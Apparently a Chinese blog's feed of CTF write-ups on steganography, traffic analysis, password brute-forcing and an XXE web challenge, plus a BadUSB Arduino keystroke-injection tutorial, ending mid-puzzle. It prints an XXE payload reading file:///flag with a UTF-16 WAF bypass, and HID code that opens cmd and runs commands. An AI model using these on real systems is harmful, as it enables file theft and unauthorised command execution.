        <content type="html"><![CDATA[<h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><p>用winhex改下宽高度值，就是第二行的第六个位置把01改为03就哦可了。</p><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;66666&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> 图片隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>菜刀666</title>
      <link href="/2020/10/04/%E8%8F%9C%E5%88%80666/"/>
      <url>/2020/10/04/%E8%8F%9C%E5%88%80666/</url>
      
        <content type="html"><![CDATA[<h2 id="搜索点（wireshark字符串搜索）"><a href="#搜索点（wireshark字符串搜索）" class="headerlink" title="搜索点（wireshark字符串搜索）"></a>搜索点（wireshark字符串搜索）</h2><p>wireshark搜索字符串的时候也是用的ctrl + f快捷键，有所不同的是把原来的过滤器换为字符串就行了。搜到后追踪流可以发现那个压缩包与txt文件。</p><h2 id="找到关键位置"><a href="#找到关键位置" class="headerlink" title="找到关键位置"></a>找到关键位置</h2><p>往下追踪流，到tcp.stream eq 7的时候找到了关键的位置，然后可以用下面的东西解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;RDpcd2FtcDY0XHd3d1x1cGxvYWRcNjY2Ni5qcGc%3D&quot;</span>));</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>出现的第一个东西是个文件的地址为<code>D:\wamp64\www\upload\6666.jpg</code>,第二个是图片</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> wireshark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2nd-EasyBaBa</title>
      <link href="/2020/10/04/BJDCTF2nd-EasyBaBa/"/>
      <url>/2020/10/04/BJDCTF2nd-EasyBaBa/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-先用binwalk查看文件"><a href="#0x01-先用binwalk查看文件" class="headerlink" title="0x01 先用binwalk查看文件"></a>0x01 先用binwalk查看文件</h2><blockquote><p>binwalk ezbb.jpg</p></blockquote><p>发现里面有隐藏的文件，这个只有一个图片文件的，要不就是文件隐藏，要不就是什么色道那种（这种不太会）。</p><h2 id="0x02-用foremost分开文件"><a href="#0x02-用foremost分开文件" class="headerlink" title="0x02 用foremost分开文件"></a>0x02 用foremost分开文件</h2><blockquote><p>foremost ezbb.jpg<br>什么都不用指定就能分解出，分出的文件在output目录里面，有个压缩包，解压后是个jpg的文件，拉到windows里面，用记事本打开，发现开头有RIFF文件头（AVI格式文件），将后缀名改为.avi后打开，果然里面藏了个视频（图片里藏视频，文件隐写真奇妙。）</p></blockquote><h2 id="0x03-pr打开扫码"><a href="#0x03-pr打开扫码" class="headerlink" title="0x03 pr打开扫码"></a>0x03 pr打开扫码</h2><p>里面很明显可以看到几帧不正常的图片，打开pr扫码吧，分为几部分，下面一行就是一张图片获得的结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">6167696E5F6C</span><br><span class="line">6F76655F59</span><br><span class="line">424A447B696D</span><br></pre></td></tr></table></figure><p>最后一张图片太模糊了，想用大佬的<a href="https://merricx.github.io/qrazybox/">这个项目</a>，但是又太麻烦，直接写了。忙活3个小时了。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">316E677D</span><br></pre></td></tr></table></figure><p>和一起</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6167696E5F6C6F76655F59424A447B696D316E677D</span><br></pre></td></tr></table></figure><p>解出来后顺序有错，调一下位置就好了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;imagin_love_Y1ng&#125;</span><br></pre></td></tr></table></figure><p>注意把BJD换为flag</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc文件隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPU2019神奇的二维码</title>
      <link href="/2020/10/03/SWPU2019%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/"/>
      <url>/2020/10/03/SWPU2019%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-先用binwalk查看图片"><a href="#0x01-先用binwalk查看图片" class="headerlink" title="0x01 先用binwalk查看图片"></a>0x01 先用binwalk查看图片</h2><p>图片隐写的一般套路就是这样，先直接用binwalk+文件名查看里面的各个文件的信息，然后加个<code>-e</code>参数可以提取里面的各个文件到一个文件夹了。</p><h2 id="0x02-拉到windows里面"><a href="#0x02-拉到windows里面" class="headerlink" title="0x02　拉到windows里面"></a>0x02　拉到windows里面</h2><p>用windows把里面能直接解压的解压，然后有个不能解压的，看样子是个音频，第一个文件夹是个图片和一个rar，第二个文件是encode的文件，解密后就是第一个文件夹里的rar压缩包的密码，拉出来后还是个图片，没搞出来。</p><h2 id="0x03-音频隐写"><a href="#0x03-音频隐写" class="headerlink" title="0x03 音频隐写"></a>0x03 音频隐写</h2><p>第三个文件夹里面是个doc文件，打开后是好长一段的base64加密。作为python的忠实用户，肯定要写一段<code>python3</code>脚本来解决这个问题啊！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">input</span>(<span class="string">&quot;请输入需要解密的base64：&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = base64.b64decode(a)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;多重解密结束!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p>如IDE有划线，请自动忽略。。。<br>解密后为<code>comEON_YOuAreSOSoS0great</code>，用此密码将音频文件拉出来。</p><h2 id="0x04-使用AU分析"><a href="#0x04-使用AU分析" class="headerlink" title="0x04 使用AU分析"></a>0x04 使用AU分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--/---/.-./..././../.../...-/./.-./-.--/...-/./.-./-.--/./.-/.../-.--/</span><br></pre></td></tr></table></figure><p>解码后为<code>MORSEISVERYVERYEASY</code><br>所以flag为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;MORSEISVERYVERYEASY&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;morseisveryveryeasy&#125;</span><br></pre></td></tr></table></figure><p>转为小写的python3代码为（没错，这么简单也要写成代码）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">input</span>(<span class="string">&quot;请输入：&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a.lower())</span><br></pre></td></tr></table></figure><blockquote><p>总结: 不知道这种音频隐写能不能用python来搞，明天或者有空的时候再搞吧！</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 隐写 </tag>
            
            <tag> 音频隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>被偷走的文件</title>
      <link href="/2020/10/03/%E8%A2%AB%E5%81%B7%E8%B5%B0%E7%9A%84%E6%96%87%E4%BB%B6/"/>
      <url>/2020/10/03/%E8%A2%AB%E5%81%B7%E8%B5%B0%E7%9A%84%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-流量分析"><a href="#0x01-流量分析" class="headerlink" title="0x01 流量分析"></a>0x01 流量分析</h2><p>首先下载下来弹出来了个让输入密码的框框，然后取消后也能正常地解压，放在kali里面用wireshark打开，搜索关键词<code>flag</code>，发现有个ftp的流量，追踪一下发现是个flag.rar(其实不用追踪就能看得到)，然后过滤ftp的流量，将过滤器的选项换为<code>ftp-data</code>就只有一个流量，追踪，保留原始数据（开始为ASCII的那个地方），save as，保存为rar后缀名的文件，发现有密码，kali解不开。</p><h2 id="0x02-rar穷举解密"><a href="#0x02-rar穷举解密" class="headerlink" title="0x02 rar穷举解密"></a>0x02 rar穷举解密</h2><p>用软件ARCHPR破解密码，但是速度有一点点慢，从四位数字开始测，口令为5790，阿巴阿巴。输入密码得flag</p>]]></content>
      
      
      <categories>
          
          <category> misc文件隐写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> 文件隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[CSAWQual 2019]Web_Unagi</title>
      <link href="/2020/09/30/2019-Web-Unagi/"/>
      <url>/2020/09/30/2019-Web-Unagi/</url>
      
        <content type="html"><![CDATA[<h2 id="判断xxe"><a href="#判断xxe" class="headerlink" title="判断xxe"></a>判断xxe</h2><p>首先看下各个界面有什么信息，看到upload界面有一个upload的功能，可以上传新的用户。然后看到here的那个链接里面的内容是xml格式的，所以我们很容易就能联想得到使用xxe、xml外部实体注入。上传一个xml文件就好了</p><h2 id="上传xxe文件"><a href="#上传xxe文件" class="headerlink" title="上传xxe文件"></a>上传xxe文件</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">users</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>lice<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd1<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>alice@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">group</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure><p>做成一个xml文件就行了，上传一下，有WAF，不知道过滤了啥。wp上说要换一下编码方式，用命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf-8 -t utf-16 1.xml&gt;2.xml</span><br></pre></td></tr></table></figure><h2 id="得flag"><a href="#得flag" class="headerlink" title="得flag"></a>得flag</h2><p><del>上面的内容转utf16后还是不行，只能用他给出的</del></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">users</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span> Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intro</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我的锅，要用linux的vim（windows上好像也有，但是下面的命令还得在linux上面执行，索性就用linux的vim）编写代码然后再使用上面的编码命令才不会报错，然后就能直接上传得flag了。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> xxe之waf绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>badusb之Arduino语法</title>
      <link href="/2020/09/29/badusb%E4%B9%8BArduino%E8%AF%AD%E6%B3%95/"/>
      <url>/2020/09/29/badusb%E4%B9%8BArduino%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="BadUsb简单用法示例"><a href="#BadUsb简单用法示例" class="headerlink" title="BadUsb简单用法示例"></a>BadUsb简单用法示例</h1><h2 id="所需硬件"><a href="#所需硬件" class="headerlink" title="所需硬件"></a>所需硬件</h2><p>badusb 自行淘宝  驱动程序会自动安装，若未自动安装自行百度</p><h2 id="所需工具"><a href="#所需工具" class="headerlink" title="所需工具"></a>所需工具</h2><p>arduino-1.5.5-r2用于编辑代码并上传至badusb<br>badusb连接至电脑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">打开arduino-1.5.5-r2-&gt;打开工具菜单-&gt;板-&gt;Arduino Leonardo</span><br><span class="line">                                   打开工具菜单-&gt;端口-&gt;选择相应的com口   //这一步极为重要</span><br></pre></td></tr></table></figure><p>左上角第二个向右的箭头图标为上传按钮，编辑好代码后上传至优盘即可。</p><h2 id="语法示例"><a href="#语法示例" class="headerlink" title="语法示例:"></a>语法示例:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">void setup() &#123;</span><br><span class="line">  // put your setup code here, to run once:</span><br><span class="line">Keyboard.begin();//开始键盘通讯</span><br><span class="line">delay(3000);//延时</span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);//win键</span><br><span class="line">delay(50);</span><br><span class="line">Keyboard.press(&#x27;r&#x27;);//r键</span><br><span class="line">delay(50);</span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);</span><br><span class="line">Keyboard.release(&#x27;r&#x27;);</span><br><span class="line">delay(1000);</span><br><span class="line">Keyboard.println(&quot;cmd &quot;); //注意这里命令的最后多了一个空格 如果目标终端的输入法是中文的话这个空格非常关键</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.println(&quot;ping  211.140.13.188 -t &quot;); ; //注意最后有一个空格</span><br><span class="line">delay(1000);//延时</span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);//win键</span><br><span class="line">delay(50);</span><br><span class="line">Keyboard.press(&#x27;r&#x27;);//r键</span><br><span class="line">delay(50);</span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);</span><br><span class="line">Keyboard.release(&#x27;r&#x27;);</span><br><span class="line">delay(1000);</span><br><span class="line">Keyboard.println(&quot;cmd &quot;); //注意最后有一个空格</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.println(&quot;start http://weibo.com/enderzhou &quot;); //注意最后有一个空格</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">void loop() &#123;</span><br><span class="line">  // put your main code here, to run repeatedly:</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">具体按键设置</span><br><span class="line">delay(5000);//延时毫秒</span><br><span class="line"> </span><br><span class="line">Keyboard.begin();     //开始键盘通讯</span><br><span class="line">Keyboard.end();     //结束键盘通讯</span><br><span class="line">Keyboard.press();     //按下键盘按键     如果是非特殊按键如 数字、字母按键用单引号括起来</span><br><span class="line">Keyboard.release();     //释放键盘按键</span><br><span class="line">Keyboard.println(&quot;&quot;);     //输入字符串使用双引号括起来</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Mouse.begin();//鼠标事件开始</span><br><span class="line">Mouse.click();//鼠标单击</span><br><span class="line">Mouse.end();//鼠标事件结束</span><br><span class="line">Mouse.move();//鼠标移动(x,y)</span><br><span class="line">Mouse.press();//鼠标按下</span><br><span class="line">Mouse.release();//鼠标松开</span><br><span class="line">Mouse.isPressed();// </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">KEY_LEFT_CTRL</span><br><span class="line">KEY_LEFT_SHIFT</span><br><span class="line">KEY_LEFT_ALT</span><br><span class="line">KEY_LEFT_GUI    //win键</span><br><span class="line">KEY_RIGHT_CTRL</span><br><span class="line">KEY_RIGHT_SHIFT</span><br><span class="line">KEY_RIGHT_ALT</span><br><span class="line">KEY_RIGHT_GUI</span><br><span class="line">KEY_UP_ARROW</span><br><span class="line">KEY_DOWN_ARROW</span><br><span class="line">KEY_LEFT_ARROW</span><br><span class="line">KEY_RIGHT_ARROW</span><br><span class="line">KEY_BACKSPACE</span><br><span class="line">KEY_TAB</span><br><span class="line">KEY_RETURN//回车键</span><br><span class="line">KEY_ESC</span><br><span class="line">KEY_INSERT</span><br><span class="line">KEY_DELETE</span><br><span class="line">KEY_PAGE_UP</span><br><span class="line">KEY_PAGE_DOWN</span><br><span class="line">KEY_HOME</span><br><span class="line">KEY_END</span><br><span class="line">KEY_CAPS_LOCK</span><br><span class="line">KEY_F1</span><br><span class="line">KEY_F2</span><br><span class="line">KEY_F3</span><br><span class="line">KEY_F4</span><br><span class="line">KEY_F5</span><br><span class="line">KEY_F6</span><br><span class="line">KEY_F7</span><br><span class="line">KEY_F8</span><br><span class="line">KEY_F9</span><br><span class="line">KEY_F10</span><br><span class="line">KEY_F11</span><br><span class="line">KEY_F12</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> badusb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>神秘龙卷风</title>
      <link href="/2020/09/28/%E7%A5%9E%E7%A7%98%E9%BE%99%E5%8D%B7%E9%A3%8E/"/>
      <url>/2020/09/28/%E7%A5%9E%E7%A7%98%E9%BE%99%E5%8D%B7%E9%A3%8E/</url>
      
        <content type="html"><![CDATA[<h1 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h1><h2 id="第一步rar密码"><a href="#第一步rar密码" class="headerlink" title="第一步rar密码"></a>第一步rar密码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5463</span><br></pre></td></tr></table></figure><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">                  <span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line">                       <span class="literal">+++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line">                            <span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">++++++++</span></span><br><span class="line">                                   <span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line">                                         <span class="literal">++++++++++++++++++++++++++++++++++++</span></span><br><span class="line">                                            <span class="literal">++++++</span><span class="string">.</span>&gt;<span class="literal">++++++++++++++++++++++</span></span><br><span class="line">                                              <span class="literal">++++++++++++++++++++++++++</span></span><br><span class="line">                                               <span class="literal">++++++++++++++++++++++++</span></span><br><span class="line">                                                <span class="literal">++++++++++++++++++++++</span></span><br><span class="line">                                                 <span class="literal">+++++++++</span><span class="string">.</span>&gt;<span class="literal">+++++++++</span></span><br><span class="line">                                                  <span class="literal">++++++++++++++++++</span></span><br><span class="line">                                                  <span class="literal">++++++++++++++++++</span></span><br><span class="line">                                                  <span class="literal">++++++++++++++++++</span></span><br><span class="line">                                                  <span class="literal">++++++++++++++++++</span></span><br><span class="line">                                                 <span class="literal">++++++++++++++++++++</span></span><br><span class="line">                                               <span class="literal">++++++++++++++++++++++</span><span class="string">.</span>&gt;</span><br><span class="line">                                             <span class="literal">+++++++++++++++++++++++++++</span></span><br><span class="line">                                           <span class="literal">+++++++++++++++++++++++++++++++</span></span><br><span class="line">                                        <span class="literal">+++++++++++++++++++++++++++++++++++++</span></span><br><span class="line">                                      <span class="literal">++++++</span><span class="string">.</span>&gt;<span class="literal">++++++++++++++++++++++++++++++++++</span></span><br><span class="line">                                    <span class="literal">++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">+++++++++++++++++++++++++++</span></span><br><span class="line">                                  <span class="literal">++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line">                                <span class="literal">+++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line">                            <span class="literal">++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">++++++</span></span><br><span class="line">                         <span class="literal">++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line">                      <span class="literal">+++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line">                   <span class="literal">+++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">+++++++</span></span><br><span class="line">                <span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">+++++++++++++++</span></span><br><span class="line">            <span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">++++++++++++++++++++++++++++++++</span></span><br><span class="line">       <span class="literal">++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;</span><br><span class="line"><span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span 